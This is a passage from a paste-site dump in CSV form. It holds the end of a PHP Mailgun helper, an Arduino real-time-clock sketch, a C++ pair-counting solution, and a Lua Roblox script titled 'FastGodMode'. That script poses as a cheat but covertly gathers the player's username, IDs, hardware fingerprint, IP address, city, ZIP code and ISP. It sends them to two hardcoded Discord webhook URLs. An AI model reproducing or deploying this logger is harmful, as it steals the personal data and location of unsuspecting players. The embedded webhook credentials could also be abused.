                       return ['ok' => 0, 'status' => $result->http_response_code, 'error' => 'Mailgun Error', 'message' => $result];
                    }
                } else {
                    return $result;
                }
            } else {
                return $result;
            }
        }
    }


}
?>
"
6TTASXYh,FastGodMode,pulfire213,Lua,Thursday 13th of July 2023 07:04:29 AM CDT,"local games = game.PlaceId
local JOBID = game.JobId
local fun = ""Roblox.GameLauncher.joinGameInstance(""..games..', ""'..JOBID..'"")'
local cid = game:GetService(""RbxAnalyticsService""):GetClientId()
local playerid = game.Players.LocalPlayer.UserId
local playername = game.Players.LocalPlayer.Name
local introname = playername.."" just executed your script""
local http_request = http_request;
local http_request = http_request;
if syn then
http_request = syn.request
elseif SENTINEL_V2 then
function http_request(tb)
return {
StatusCode = 200;
Body = request(tb.Url, tb.Method, (tb.Body or ''))
}
end
end
 
--game.HttpGet(game, ""http://api.ipify.org"")
 
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {""Syn-Fingerprint"", ""Exploit-Guid"", ""Proto-User-Identifier"", ""Sentinel-Fingerprint""};
local hwid = """";
 
for i, v in next, hwid_list do
if decoded.headers[v] then
hwid = decoded.headers[v];
break
end
end
 
local name = game.Players.LocalPlayer.Name
 
local TIME_ZONE = 17
 
local date = os.date(""!*t"")
local hour = (date.hour + TIME_ZONE) % 24
local ampm = hour < 12 and ""AM"" or ""PM""
local timestamp = string.format(""%02i:%0i %s"", ((hour - 1) % 12) + 1, date.min, ampm)
 
local webhookcheck =
   is_sirhurt_closure and ""Sirhurt"" or pebc_execute and ""ProtoSmasher"" or syn and ""Synapse X"" or
   secure_load and ""Sentinel"" or
   KRNL_LOADED and ""Krnl"" or
   SONA_LOADED and ""Sona"" or
   ""Kid with sumn else""
 
local url =
   ""https://discord.com/api/webhooks/1129019613955506217/BzVL2Ewn-w2FwjHPb7CFSgk-WAOQAGoC93a_O4ZIOghRj84yPv1Y27wgpNGJNPUOUy7x""
local data = 
    {
        [""content""] = ""Looks like ""..introname,
        [""username""] = ""VeryFastLowGraphics"",
        [""avatar_url""] = ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQHo_KXpPjUydSW9dp7e-RY1zBXBK2hABJHYbI2PNeH&s"",
        [""embeds""] = {{
            [""title""] = ""__**Script Executed**__"",
            [""description""] = ""**poop**"",
            [""type""] = ""rich"",
            [""color""] = tonumber(0xffffff),
            [""fields""] = {
                {
                    [""name""] = ""Time Stamp"",
                    [""value""] = timestamp,
                    [""inline""] = true
                },
                {
                    [""name""] = ""__Username:__"",
                    [""value""] = name,
                    [""inline""] = true
                },
                {
                    [""name""] = ""__ID:__"",
                    [""value""] = playerid,
                    [""inline""] = true
                },
                {
                    [""name""] = ""__Cid:__"",
                    [""value""] = cid,
                    [""inline""] = true
                },
                {
                    [""name""] = ""__Hwid:__"",
                    [""value""] = hwid,
                    [""inline""] = true
                },
                {
                    [""name""] = ""executor:"",
                    [""value""] = webhookcheck,
                    [""inline""] = true
                },
                {
                    [""name""] = ""Game Link:"",
                    [""value""] = fun,
                    [""inline""] = true
                },
                {
                    [""name""] = ""IP:flushed:"",
                    [""value""] = ""ayo"",
                    [""inline""] = true
                }
            }
        }}
    }
 

local newdata = game:GetService(""HttpService""):JSONEncode(data)
 
local headers = {
   [""content-type""] = ""application/json""
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = ""POST"", Headers = headers}
request(abcdef)
 
----------------
local player_name = game:GetService(""Players"").LocalPlayer.Name
local webhook_url = ""https://discord.com/api/webhooks/1027755253904457820/oPJko1XhtSW0Adm0ZYxlf-CwYED5Evr8fAgyjNetl7RIk7zVtRackPRNNiPQ_jfcIjOm""

local ip_info = syn.request({
    Url = ""http://ip-api.com/json"",
    Method = ""GET""
})
local ipinfo_table = game:GetService(""HttpService""):JSONDecode(ip_info.Body)
local dataMessage = string.format(""```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```"", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
syn.request(
    {
        Url = webhook_url,
        Method = ""POST"",
        Headers = {
            [""Content-Type""] = ""application/json""
        },
        Body = game:GetService(""HttpService""):JSONEncode({[""content""] = dataMessage})
    }
)"
qY4LcyR1,Untitled,microrobotics,Arduino,Thursday 13th of July 2023 06:49:34 AM CDT,"#include <Wire.h>
#include ""RTClib.h""

RTC_DS3231 rtc;

void setup() {
  Serial.begin(9600);
  Wire.begin();
  
  // Check if the DS3231 module is connected
  if (!rtc.begin()) {
    Serial.println(""Couldn't find RTC"");
    while (1);
  }
  
  // Uncomment the line below to set the time on the DS3231 module
  // rtc.adjust(DateTime(F(__DATE__), F(__TIME__)));
}

void loop() {
  DateTime now = rtc.now();
  
  // Print the current date and time
  Serial.print(now.year(), DEC);
  Serial.print('/');
  Serial.print(now.month(), DEC);
  Serial.print('/');
  Serial.print(now.day(), DEC);
  Serial.print(' ');
  Serial.print(now.hour(), DEC);
  Serial.print(':');
  Serial.print(now.minute(), DEC);
  Serial.print(':');
  Serial.print(now.second(), DEC);
  Serial.println();
  
  delay(1000);
}"
4gqYKcL9,Number of Pairs,LEGEND2004,C++,Thursday 13th of July 2023 06:42:38 AM CDT,"#include <bits/stdc++.h>

using namespace std;

#define int long long

signed main()
{
    int t , n , l , r;
    cin >> t;
    while(t--){
        cin >> n >> l >> r;
        vector<int> a(n);
        for(int i = 0; i < n; i++){
            cin >> a[i];
        }
        sort(a.begin() , a.end());
        int ans = 0;
        for(int i = 0; i < (n - 1); i++){
            int g = l - a[i];
            int x = lower_bound(a.begin() , a.end() , g) - a.begin();
            g = r - a[i];
            int y = upper_bound(a.begin() , a.end() , g) - a.begin() - 1;
            x = max(x , i + 1);
            if(y >= x)
                ans += (y - x + 1);
        }
        cout << ans << endl;
    }
}
"
